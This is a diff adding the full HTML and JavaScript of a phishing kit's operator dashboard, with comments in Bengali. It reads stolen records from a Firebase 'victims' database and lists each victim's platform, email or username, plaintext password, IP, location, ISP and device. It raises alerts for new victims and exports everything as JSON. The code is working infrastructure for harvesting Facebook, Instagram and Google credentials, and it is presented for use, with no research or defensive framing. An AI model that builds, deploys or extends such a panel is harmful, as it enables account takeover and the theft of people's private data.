@@ -1,0 +1,529 @@
+<!-- ═══════════════════════════════════════════════════════════
+     FILE: index.html - মেইন ফাইল (সব লজিক এখানে)
+     ═══════════════════════════════════════════════════════════ -->
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎯 Phishing Framework - Control Panel</title>
+    
+    <!-- Firebase SDK (CDN - একবারই লোড হবে) -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --panel: #12121a;
+            --border: #1e1e2e;
+            --green: #00ff88;
+            --red: #ff4444;
+            --gold: #FFD700;
+            --cyan: #8be9fd;
+            --purple: #bd93f9;
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
+            background: var(--bg);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .header {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .header h1 {
+            color: var(--green);
+            font-size: 26px;
+            letter-spacing: 2px;
+        }
+        
+        .header .status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .live-dot {
+            width: 10px;
+            height: 10px;
+            background: var(--green);
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        /* Stats */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .stat-card:hover {
+            border-color: var(--green);
+            transform: translateY(-2px);
+        }
+        
+        .stat-card .number {
+            font-size: 38px;
+            font-weight: bold;
+            color: var(--gold);
+        }
+        
+        .stat-card .label {
+            color: rgba(255,255,255,0.6);
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .tab-btn {
+            padding: 10px 20px;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .tab-btn.active {
+            background: var(--green);
+            color: var(--bg);
+            font-weight: bold;
+        }
+        
+        .tab-btn:hover {
+            border-color: var(--green);
+        }
+        
+        /* Victim list */
+        .victim-list {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px;
+        }
+        
+        .victim-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 18px;
+            margin-bottom: 12px;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(-20px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .victim-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .victim-platform {
+            padding: 4px 12px;
+            background: var(--purple);
+            color: var(--bg);
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .victim-time {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+        }
+        
+        .victim-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 10px;
+        }
+        
+        .info-item {
+            background: rgba(255,255,255,0.02);
+            padding: 10px;
+            border-radius: 8px;
+        }
+        
+        .info-item .key {
+            color: rgba(255,255,255,0.5);
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .info-item .value {
+            color: #fff;
+            font-size: 14px;
+            margin-top: 3px;
+            word-break: break-all;
+        }
+        
+        .no-victims {
+            text-align: center;
+            padding: 40px;
+            color: rgba(255,255,255,0.3);
+            font-size: 16px;
+        }
+        
+        /* Search */
+        .search-bar {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: white;
+            font-family: inherit;
+            font-size: 14px;
+            margin-bottom: 20px;
+            outline: none;
+        }
+        
+        .search-bar:focus {
+            border-color: var(--green);
+        }
+        
+        /* Delete button */
+        .delete-btn {
+            padding: 5px 10px;
+            background: var(--red);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 11px;
+            font-family: inherit;
+        }
+        
+        /* Export */
+        .export-btn {
+            padding: 10px 20px;
+            background: var(--cyan);
+            color: var(--bg);
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: bold;
+        }
+        
+        .export-btn:hover {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div>
+            <h1>🎯 PHISHING DASHBOARD</h1>
+            <p style="color:rgba(255,255,255,0.5);font-size:11px;">Real-time victim monitoring</p>
+        </div>
+        <div class="status">
+            <div class="live-dot"></div>
+            <span style="color:var(--green);">LIVE</span>
+        </div>
+        <button class="export-btn" onclick="exportData()">📥 Export JSON</button>
+    </div>
+    
+    <!-- Stats -->
+    <div class="stats-grid">
+        <div class="stat-card" onclick="filterByPlatform('all')">
+            <div class="number" id="totalVictims">0</div>
+            <div class="label">Total Victims</div>
+        </div>
+        <div class="stat-card" onclick="filterByPlatform('facebook')">
+            <div class="number" id="facebookCount">0</div>
+            <div class="label">Facebook</div>
+        </div>
+        <div class="stat-card" onclick="filterByPlatform('instagram')">
+            <div class="number" id="instagramCount">0</div>
+            <div class="label">Instagram</div>
+        </div>
+        <div class="stat-card" onclick="filterByPlatform('google')">
+            <div class="number" id="googleCount">0</div>
+            <div class="label">Google</div>
+        </div>
+        <div class="stat-card" onclick="filterByPlatform('other')">
+            <div class="number" id="otherCount">0</div>
+            <div class="label">Others</div>
+        </div>
+    </div>
+    
+    <!-- Search -->
+    <input type="text" class="search-bar" id="searchInput" placeholder="🔍 Search by email, IP, phone..." onkeyup="searchVictims(this.value)">
+    
+    <!-- Tabs -->
+    <div class="tabs" id="tabsContainer">
+        <button class="tab-btn active" onclick="filterByPlatform('all')">All</button>
+        <button class="tab-btn" onclick="filterByPlatform('facebook')">Facebook</button>
+        <button class="tab-btn" onclick="filterByPlatform('instagram')">Instagram</button>
+        <button class="tab-btn" onclick="filterByPlatform('google')">Google</button>
+        <button class="tab-btn" onclick="filterByPlatform('other')">Others</button>
+    </div>
+    
+    <!-- Victim List -->
+    <div class="victim-list">
+        <h3 style="margin-bottom:15px;color:var(--red);">📋 VICTIM RECORDS</h3>
+        <div id="victimContainer">
+            <div class="no-victims">⏳ Waiting for victims...</div>
+        </div>
+    </div>
+    
+    <!-- Firebase Init -->
+    <script src="./config.js"></script>
+    <script>
+        // ═══════════════════════════════════════════════════════
+        // MAIN LOGIC
+        // ═══════════════════════════════════════════════════════
+        
+        let allVictims = {};
+        let currentFilter = 'all';
+        let currentSearch = '';
+        
+        // Firebase init (config.js থেকে firebaseConfig পাওয়া যাবে)
+        firebase.initializeApp(window.firebaseConfig);
+        const database = firebase.database();
+        
+        // Real-time listener
+        database.ref('victims').on('value', (snapshot) => {
+            allVictims = snapshot.val() || {};
+            renderVictims();
+        });
+        
+        // New victim alert
+        database.ref('victims').on('child_added', (snapshot) => {
+            const victim = snapshot.val();
+            showNotification(victim);
+            playAlert();
+        });
+        
+        function renderVictims() {
+            const container = document.getElementById('victimContainer');
+            const victimIds = Object.keys(allVictims);
+            
+            // Update stats
+            updateStats();
+            
+            // Filter victims
+            let filteredIds = victimIds.filter(id => {
+                const v = allVictims[id];
+                if (!v) return false;
+                
+                // Platform filter
+                if (currentFilter !== 'all') {
+                    if (currentFilter === 'other') {
+                        if (['facebook', 'instagram', 'google'].includes(v.platform)) return false;
+                    } else {
+                        if (v.platform !== currentFilter) return false;
+                    }
+                }
+                
+                // Search filter
+                if (currentSearch) {
+                    const searchStr = JSON.stringify(v).toLowerCase();
+                    if (!searchStr.includes(currentSearch.toLowerCase())) return false;
+                }
+                
+                return true;
+            });
+            
+            // Sort by timestamp
+            filteredIds.sort((a, b) => {
+                return new Date(allVictims[b].timestamp || 0) - new Date(allVictims[a].timestamp || 0);
+            });
+            
+            if (filteredIds.length === 0) {
+                container.innerHTML = '<div class="no-victims">⏳ No victims found</div>';
+                return;
+            }
+            
+            let html = '';
+            filteredIds.forEach(id => {
+                html += createVictimCard(allVictims[id], id);
+            });
+            container.innerHTML = html;
+        }
+        
+        function createVictimCard(v, id) {
+            const time = new Date(v.timestamp || Date.now()).toLocaleString();
+            const platformBadge = v.platform || 'unknown';
+            
+            return `
+                <div class="victim-card">
+                    <div class="victim-header">
+                        <span class="victim-platform">${platformBadge.toUpperCase()}</span>
+                        <span style="color:var(--cyan);font-weight:bold;">${v.email || v.username || v.fullName || 'Unknown'}</span>
+                        <span class="victim-time">${time}</span>
+                    </div>
+                    <div class="victim-info">
+                        <div class="info-item">
+                            <div class="key">Password</div>
+                            <div class="value" style="color:var(--red);font-weight:bold;">${v.password || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">IP Address</div>
+                            <div class="value">${v.ipInfo?.ip || v.ip || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">Location</div>
+                            <div class="value">${v.ipInfo?.city || 'N/A'}, ${v.ipInfo?.country || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">ISP</div>
+                            <div class="value">${v.ipInfo?.isp || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">Device</div>
+                            <div class="value">${v.deviceInfo?.device || 'N/A'} / ${v.deviceInfo?.os || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">Browser</div>
+                            <div class="value">${v.deviceInfo?.browser || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">User Agent</div>
+                            <div class="value" style="font-size:11px;">${(v.deviceInfo?.userAgent || 'N/A').substring(0, 60)}...</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">Referrer</div>
+                            <div class="value">${v.referrer || 'Direct'}</div>
+                        </div>
+                    </div>
+                    <div style="margin-top:10px;text-align:right;">
+                        <button class="delete-btn" onclick="deleteVictim('${id}')">🗑️ Delete</button>
+                    </div>
+                </div>
+            `;
+        }
+        
+        function updateStats() {
+            const ids = Object.keys(allVictims);
+            let fb = 0, ig = 0, gg = 0, other = 0;
+            
+            ids.forEach(id => {
+                const v = allVictims[id];
+                if (!v) return;
+                if (v.platform === 'facebook') fb++;
+                else if (v.platform === 'instagram') ig++;
+                else if (v.platform === 'google') gg++;
+                else other++;
+            });
+            
+            document.getElementById('totalVictims').textContent = ids.length;
+            document.getElementById('facebookCount').textContent = fb;
+            document.getElementById('instagramCount').textContent = ig;
+            document.getElementById('googleCount').textContent = gg;
+            document.getElementById('otherCount').textContent = other;
+        }
+        
+        function filterByPlatform(platform) {
+            currentFilter = platform;
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            event?.target?.classList.add('active');
+            renderVictims();
+        }
+        
+        function searchVictims(query) {
+            currentSearch = query;
+            renderVictims();
+        }
+        
+        function deleteVictim(id) {
+            if (confirm('Delete this victim?')) {
+                database.ref('victims/' + id).remove();
+            }
+        }
+        
+        function exportData() {
+            const dataStr = JSON.stringify(allVictims, null, 2);
+            const blob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'victims_export_' + Date.now() + '.json';
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+        
+        function showNotification(victim) {
+            if (Notification.permission === 'granted') {
+                new Notification('🎯 New Victim!', {
+                    body: `${victim.platform} - ${victim.email || victim.username || 'Unknown'}`,
+                    icon: '🔴'
+                });
+            }
+        }
+        
+        if (Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
+        
+        function playAlert() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.frequency.value = 800;
+                osc.type = 'sine';
+                gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.5);
+            } catch(e) {}
+        }
+    </script>
+</body>
+</html>
